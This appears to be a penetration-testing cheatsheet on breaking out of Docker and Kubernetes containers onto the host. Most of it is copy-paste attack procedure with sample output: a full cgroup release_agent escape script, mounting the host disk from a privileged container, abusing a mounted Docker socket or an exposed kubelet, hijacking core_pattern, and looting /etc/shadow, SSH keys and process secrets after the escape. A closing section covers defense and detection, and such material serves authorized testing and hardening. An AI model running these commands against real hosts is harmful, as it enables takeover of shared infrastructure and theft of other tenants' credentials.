# Linux — Docker & Container Escape

Cheatsheet for breaking out of a Docker/containerd container onto the **host**. Scope: you already have a shell inside a container (web RCE, a pulled malicious image, a CI runner) and want host access. Getting the initial shell is covered in [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md); escalating to `root` *inside* the container namespace follows the normal [Privilege Escalation](Privilege%20Escalation.md) note.

> **Escapes are high-impact and in-scope only if the engagement says so.** Breaking out usually means owning every other tenant on that host, and a few vectors (kernel exploits, `insmod`, `sysrq-trigger`) can panic the box. Confirm the rules of engagement in writing, and prefer a misconfiguration over a kernel CVE.

A container is just a host process with its own **namespaces**, **cgroups**, **capabilities** and a **seccomp/AppArmor** profile. Almost every escape is one of those four being too loose, or a host resource bind-mounted inside. Enumerate those first and the escape usually falls out of the output.

## Contents

- [Am I in a container?](#am-i-in-a-container)
- [Enumerate before you escape](#enumerate-before-you-escape)
- [Tooling (automation)](#tooling-automation)
- [Escape matrix (finding → escape)](#escape-matrix-finding--escape)
- [Privileged container](#privileged-container)
- [CAP_SYS_ADMIN — cgroup release_agent](#cap_sys_admin--cgroup-release_agent)
- [Mounted Docker socket](#mounted-docker-socket)
- [Other dangerous capabilities](#other-dangerous-capabilities)
- [Host filesystem mounts](#host-filesystem-mounts)
- [Shared host namespaces (PID / net)](#shared-host-namespaces-pid--net)
- [Exposed Docker / Kubelet API](#exposed-docker--kubelet-api)
- [Runtime & kernel CVEs (last resort)](#runtime--kernel-cves-last-resort)
- [Kubernetes-specific paths](#kubernetes-specific-paths)
- [After the escape](#after-the-escape)
- [Defense / detection (for the report)](#defense--detection-for-the-report)

## Am I in a container?

```bash
ls -la /.dockerenv                       # Docker's marker file (not always present)
cat /proc/1/cgroup                       # docker/containerd/kubepods in the paths (cgroup v1)
systemd-detect-virt -c                   # prints docker/lxc/podman if containerized
grep -i -e overlay -e docker /proc/self/mountinfo   # overlayfs root = container
hostname                                 # a random 12-hex id is a giveaway
ls /run/secrets/kubernetes.io 2>/dev/null   # present = a Kubernetes pod, not plain Docker
```

**Why:** confirm you're containerized and which runtime, so you pick the right escape. Expected output inside a container:

```text
$ cat /proc/1/cgroup
12:pids:/docker/3b5a9f1c8e...        # a "docker"/"kubepods" path = containerized
$ systemd-detect-virt -c
docker                                # on a bare host this prints "none"
```

On **cgroup v2** hosts `/proc/1/cgroup` shows only `0::/`, so fall back to `/.dockerenv`, overlayfs in `mountinfo`, and the short process list under `/proc`.

## Enumerate before you escape

This is the whole game — read the output against the [escape matrix](#escape-matrix-finding--escape) below.

```bash
id; capsh --print                        # effective capabilities
grep Cap /proc/self/status               # CapEff bits (0000003fffffffff / ...1ffffffffff ≈ --privileged)
grep Seccomp /proc/self/status           # 0 = no seccomp filter (2 = filtered)
cat /proc/self/attr/current 2>/dev/null  # AppArmor profile; "unconfined" = none

mount                                     # host paths bind-mounted in (/, docker.sock, etc.)
cat /proc/self/mountinfo                  # note any host directory mounted inside
ls -la /dev                               # /dev/sda, /dev/mem, /dev/kmsg visible ≈ privileged
ls -la /var/run/docker.sock              # the Docker socket mounted in = game over
env | grep -i -e key -e token -e pass     # secrets passed as env vars

ss -tulpn 2>/dev/null || netstat -tulpn  # listening ports reachable from here (host ports if --net=host)
```

**Why:** these four — caps, seccomp, mounts, exposed devices — decide every escape. Expected output in a `--privileged` container (the jackpot) vs. a hardened one:

```text
$ grep -e CapEff -e Seccomp /proc/self/status
CapEff:	000001ffffffffff     # all caps  (hardened: ~00000000a80425fb)
Seccomp:	0                # no syscall filter  (hardened: 2)
$ ls -la /dev/sda
brw-rw---- 1 root disk 8, 0 ... /dev/sda   # host disk exposed -> mount it (absent when hardened)
$ ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 ... /var/run/docker.sock   # socket mounted in = game over
```

Decode capability masks with `capsh --decode=<hex>`. A full set (`cap_sys_admin`, `cap_sys_ptrace`, `cap_sys_module`, `cap_dac_read_search`…) usually means the container was started `--privileged` or with a wide `--cap-add`.

## Tooling (automation)

Tools fall into two camps: **enumerators** (tell you which escape is available) and **auto-exploiters** (run the breakout for you). On a client engagement, enumerate automatically but understand the vector before firing an exploiter — an auto-escape can start a privileged container or load a module on a production host.

**Enumeration + auto-exploit**

- **[deepce](https://github.com/stealthcopter/deepce)** — "Docker Enumeration, Escalation of Privileges and Container Escapes". Single dependency-free bash script; enumerates everything in the sections above and will auto-exploit the Docker socket, privileged mode and the cgroup `release_agent` path (`--exploit`). The first tool to drop in a fresh container.
- **[CDK](https://github.com/cdk-team/CDK)** (Container DucK) — static Go binary, zero dependencies. `cdk evaluate` enumerates; `cdk run <exploit>` fires a specific breakout (`mount-cgroup`, `docker-sock-*`, `mount-disk`, etc.). Also bundles network tools for pivoting out of the container.
- **[BOtB](https://github.com/brompwnie/botb)** (Break Out The Box) — Go CLI/CICD tool that autopwns the Docker socket, privileged containers and cloud metadata.
- **[traitor](https://github.com/liamg/traitor)** — Go Linux-privesc autoexploiter; covers the `docker` group, writable `docker.sock` and several known CVEs, so it's useful both inside the container and after you reach the host namespace.

**Enumeration only**

- **[amicontained](https://github.com/genuinetools/amicontained)** — reports the runtime, namespaces, effective capabilities and the seccomp/AppArmor profile in one shot. Great first look.
- **LinPEAS** — its container/Docker section flags `docker.sock`, caps, `.dockerenv` and mounts; you likely already run it (see [Linux Overview](Linux%20Overview.md)).
- **[container-canary](https://github.com/NVIDIA/container-canary)** / **[grype](https://github.com/anchore/grype)**, **trivy** — defensive-leaning (config/image scanning), handy to confirm a finding.

**Metasploit modules**

```
exploit/linux/local/docker_privileged_container_escape   # privileged container -> host
exploit/linux/local/runc_cwd_priv_esc                    # CVE-2024-21626 (Leaky Vessels)
exploit/linux/local/docker_runc_escape                   # CVE-2019-5736 (runc /proc/self/exe)
post/multi/recon/local_exploit_suggester                 # shortlist what applies
```

**Kubernetes**

- **[Peirates](https://github.com/inguardians/peirates)** — the go-to K8s attack tool: steals service-account tokens, abuses the kubelet (`:10250`), creates privileged/hostPath pods and pivots across the cluster.
- **[kdigger](https://github.com/quarkslab/kdigger)** — context-discovery/enumeration for a compromised pod.
- **[kube-hunter](https://github.com/aquasecurity/kube-hunter)** — scans the cluster/node for the exposed-API and kubelet weaknesses the note covers.

## Escape matrix (finding → escape)

| What you found | Escape |
| --- | --- |
| `--privileged` / full cap set / `/dev/sda` visible | [Privileged container](#privileged-container) → mount host disk |
| `CapEff` has `cap_sys_admin`, no AppArmor | [cgroup release_agent](#cap_sys_admin--cgroup-release_agent) |
| `/var/run/docker.sock` mounted in | [Mounted Docker socket](#mounted-docker-socket) |
| `cap_sys_module` | load a kernel module (`insmod`) that runs your code as host root |
| `cap_sys_ptrace` + host PID ns | inject into a host process |
| `cap_dac_read_search` | `shocker`-style arbitrary host file read |
| Host dir bind-mounted (`/`, `/root`, `/etc`) | [Host filesystem mounts](#host-filesystem-mounts) |
| `--pid=host` / `--net=host` | [Shared host namespaces](#shared-host-namespaces-pid--net) |
| Docker API `:2375`, kubelet `:10250` reachable | [Exposed API](#exposed-docker--kubelet-api) |
| Old runc/containerd/kernel | [Runtime & kernel CVEs](#runtime--kernel-cves-last-resort) |

## Privileged container

`--privileged` disables most isolation: full capabilities, no seccomp/AppArmor, and **host devices exposed under `/dev`**. The cleanest escape is to mount the host root filesystem from the raw disk:

```bash
# Find the host's root partition, then mount and chroot into it
lsblk ; fdisk -l 2>/dev/null
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host        # pick the host root device from lsblk
chroot /mnt/host sh              # now operating on the host filesystem
# -> write an SSH key to /root/.ssh, add a cron job, or edit /etc/passwd
```

**Why:** `--privileged` leaves the raw host disk at `/dev/sda*`; mounting it bypasses every namespace. `lsblk` shows which device to mount:

```text
$ lsblk
NAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
sda      8:0    0  40G  0 disk           # the host disk -> sda1 is its root fs
└─sda1   8:1    0  40G  0 part
$ chroot /mnt/host cat /etc/hostname     # prints the HOST's name, not the container's
```

If no block device is exposed but you still hold `cap_sys_admin`, use the cgroup technique below.

## CAP_SYS_ADMIN — cgroup release_agent

Classic breakout when the container has `cap_sys_admin` and AppArmor isn't confining it (common in `--privileged`). On **cgroup v1**, the kernel runs the `release_agent` program *on the host* when the last task in a cgroup exits:

```bash
# mount a cgroup controller we control
mkdir /tmp/cg && mount -t cgroup -o rdma cgroup /tmp/cg
mkdir /tmp/cg/x && echo 1 > /tmp/cg/x/notify_on_release

# host path of our container fs (overlay upperdir) so the host can see our script
host_path=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/cmd" > /tmp/cg/release_agent

# payload runs as root ON THE HOST when the cgroup empties
cat > /cmd <<EOF
#!/bin/sh
ip a > $host_path/out      # proof: host interfaces; swap for a reverse shell / SSH key
EOF
chmod +x /cmd

# trigger: spawn a process in the cgroup and let it exit
sh -c "echo \$\$ > /tmp/cg/x/cgroup.procs"
cat /out
```

**Why:** `release_agent` runs on the host, so you get code execution outside the container without a disk or socket. The payload here writes host interfaces back into the container as proof:

```text
$ cat /out
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 ...
2: eth0: ... inet 10.0.2.15/24 ...        # the HOST's NICs, not the container's
# real engagement: swap the payload for a reverse shell or an SSH key into /root/.ssh
```

This path is cgroup-**v1** only; modern cgroup-v2 hosts don't expose `release_agent`, so fall back to disk mount, the Docker socket, or a runtime CVE.

## Mounted Docker socket

If `/var/run/docker.sock` is bind-mounted into the container, you control the host's Docker daemon — talk to it and start a new container that mounts host `/`:

```bash
# with the docker CLI present
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh

# no docker CLI? drive the API over the socket with curl
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json   # confirm access
# then create+start a privileged container mounting / via POST /containers/create
```

**Why / confirm:** reaching the daemon = you can launch a container that mounts the host. A JSON array (not a connection error) proves access:

```text
$ curl -s --unix-socket /var/run/docker.sock http://localhost/version
{"Version":"24.0.7","ApiVersion":"1.43","Os":"linux","Arch":"amd64", ... }
```

Inside the new container, `chroot /host` gives you the host filesystem as root. Same idea applies to a mounted **containerd** (`/run/containerd/containerd.sock`) or **podman** socket.

## Other dangerous capabilities

Check `capsh --print` / `CapEff` for these even without `--privileged`:

- **`cap_sys_module`** — load a kernel module that executes your code in ring 0:
  ```bash
  # build a tiny module whose init_module() spawns a host reverse shell, then:
  insmod ./evil.ko
  ```
- **`cap_sys_ptrace`** + `--pid=host` — attach to and inject shellcode into a host process.
- **`cap_dac_read_search`** — read any host file via open-by-handle (`shocker` technique) to grab `/etc/shadow`, SSH keys, tokens.
- **`cap_sys_admin`** without AppArmor — the [release_agent](#cap_sys_admin--cgroup-release_agent) path, or mount abuse.

## Host filesystem mounts

Any host directory bind-mounted into the container is a foothold even without extra capabilities — check `mount` / `/proc/self/mountinfo`:

- **`/` or `/root` / `/home` mounted** → write an SSH key, cron job, or a SUID binary directly.
- **`/etc` mounted writable** → add a root user to `/etc/passwd` or a `NOPASSWD` sudoers drop-in.
- **`/var/run/docker.sock`** → see [Mounted Docker socket](#mounted-docker-socket).
- **Host `/proc` mounted** (`/proc/sys/kernel/core_pattern`) → set `core_pattern` to a pipe that runs your handler as host root when any process core-dumps.

```bash
# core_pattern escape when host /proc is writable
echo "|/host_path/payload" > /proc/sys/kernel/core_pattern
# then crash a process in the container to trigger the handler on the host
```

**Why:** a bind-mounted host path is host access with zero capabilities needed. Spot it in `mount` output:

```text
$ mount | grep -E ' / | /host| /etc '
/dev/sda1 on /host type ext4 (rw,relatime)      # host root mounted rw -> write a key/cron
# no extra caps required; just write to /host/root/.ssh/authorized_keys
```

## Shared host namespaces (PID / net)

- **`--pid=host`** — you see every host process (`ps aux`), their `/proc/<pid>/root` and environment (secrets, tokens). Combine with `cap_sys_ptrace` to inject into one; read `/proc/1/environ` for creds.
- **`--net=host`** — the container shares the host network stack: reach services bound to `127.0.0.1` on the host (databases, the Docker API, kubelet), sniff traffic, and ARP/spoof on the host's interfaces.
- **`--ipc=host`** — access host shared memory segments.

**Why:** sharing a host namespace drops the wall for that resource. With `--pid=host`, `ps aux` shows the host's processes (and their secrets):

```text
$ ps aux | head -3
root    1  ... /sbin/init                       # host PID 1 = init, not your app -> PID ns shared
root  842  ... /usr/bin/dockerd                  # host daemon visible
$ cat /proc/842/environ | tr '\0' '\n' | grep -i token   # read another process's secrets
```

## Exposed Docker / Kubelet API

Reachable over the network (often after a `--net=host` or an internal pivot):

```bash
# Is a host port open? Pure-bash probe — no nmap/nc needed inside the container
for p in 2375 2376 10250 10255; do (echo > /dev/tcp/127.0.0.1/$p) 2>/dev/null && echo "$p open"; done

# Docker daemon exposed without TLS
curl -s http://<host>:2375/version
docker -H tcp://<host>:2375 run -v /:/host --rm -it alpine chroot /host sh

# Kubelet read/exec (Kubernetes)
curl -sk https://<node>:10250/pods                       # list pods
curl -sk https://<node>:10250/run/<ns>/<pod>/<container> -d "cmd=id"   # exec into a pod
```

**Why / confirm:** the probe tells you an API is listening before you spend time on it. Expected output:

```text
$ for p in 2375 2376 10250 10255; do (echo > /dev/tcp/127.0.0.1/$p) 2>/dev/null && echo "$p open"; done
2375 open
10250 open
$ curl -s http://127.0.0.1:2375/version      # 2375 confirmed -> daemon with no auth
{"Version":"24.0.7","ApiVersion":"1.43", ... }
```

An open `:2375` is a full host compromise; `:10250` exec gives code in any pod on the node.

## Runtime & kernel CVEs (last resort)

Match the runtime/kernel version to a known breakout — these can be noisy or destabilizing, so use only when a misconfig isn't available and the engagement allows it:

- **runc `/proc/self/exe` overwrite — CVE-2019-5736:** a malicious image/exec overwrites the host `runc` binary → host root on next `docker exec`.
- **Leaky Vessels — CVE-2024-21626:** runc working-directory file-descriptor leak lets a crafted image access the host filesystem.
- **containerd CVE-2020-15257** (`containerd-shim` abuse via the host network namespace).
- **Dirty Pipe (CVE-2022-0847)** / **DirtyCow (CVE-2016-5195)** / **OverlayFS (CVE-2021-3493, CVE-2023-0386)** — kernel is shared with the host, so a kernel LPE from inside the container is a host compromise. See the kernel section of [Privilege Escalation](Privilege%20Escalation.md).

## Kubernetes-specific paths

```bash
# Service-account token mounted into most pods
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
# use it against the API server; check what it can do
kubectl auth can-i --list --token=$(cat .../token)
```

**Why:** the mounted token *is* an API credential; its RBAC decides the next move. Look for pod/create or secret access:

```text
$ kubectl auth can-i --list --token=$(cat .../token)
Resources    Non-Resource URLs   Resource Names   Verbs
pods         []                  []               [get list create]   # create -> privileged pod -> host
secrets      []                  []               [get list]          # or just loot cluster secrets
```

- Over-permissive service account → create a **privileged pod** that mounts host `/` (`hostPath: /`) and `chroot` in.
- Cloud metadata from a pod (`169.254.169.254`) often yields node IAM credentials → cluster/cloud takeover.
- Hunt other pods' secrets and the kubelet (`:10250`) as above.

## After the escape

```bash
id ; hostname                            # confirm you're on the host, not the container
cat /etc/shadow ; ls -la /root/.ssh      # loot host hashes + keys
docker ps -a ; crictl ps -a 2>/dev/null  # enumerate the other containers/tenants you now own
grep -rIl -e password -e secret -e token /etc /opt /srv /var/lib/docker 2>/dev/null
```

**Why:** confirm the breakout before looting — the hostname/filesystem should be the host's, not the container's:

```text
$ hostname        # before: 3b5a9f1c8e2d  (random container id)
prod-web-01       # after:  the real host name
$ ls /var/lib/docker/containers   # only visible from the host -> you're out
4f2c...  8a1b...  d9e3...
```

Pivot: other containers on the host, their volumes and secrets, the orchestration layer (Swarm/Kubernetes), and cloud metadata. Record every file you created (mounts, pods, keys, cron) so it can be cleaned up, and note the exact misconfig for the finding. Domain/cloud creds found here feed the [AD notes](../AD/AD%20Attacks%20Overview.md) and your cloud workflow.

## Defense / detection (for the report)

- **Don't run `--privileged`;** drop all capabilities and add back only what's needed (`--cap-drop=ALL --cap-add=...`). Never add `SYS_ADMIN`, `SYS_MODULE`, `SYS_PTRACE`, `DAC_READ_SEARCH` without cause.
- **Never mount the Docker/containerd socket** into a container; if a workload must talk to Docker, use a brokered, authorized proxy.
- **Run as non-root** in the container (`USER`), with `--user`, `no-new-privileges`, a read-only root FS, and a user namespace (`userns-remap`) so container root ≠ host root.
- **Keep seccomp and AppArmor/SELinux profiles on** (the default profiles block the release_agent and module paths); don't run `--security-opt seccomp=unconfined`.
- **Avoid host namespaces** (`--pid=host`, `--net=host`, `--ipc=host`) and broad `hostPath` mounts; in Kubernetes enforce this with Pod Security Admission / an admission controller (OPA/Kyverno).
- **Patch the runtime and kernel** promptly (runc, containerd, Docker) — the breakout CVEs above are all patched.
- **Detect:** `auditd`/Falco rules for `mount` inside containers, writes to `release_agent`/`core_pattern`, `insmod`, unexpected `docker.sock` access, and a container process suddenly reading host paths or spawning host-PID children.
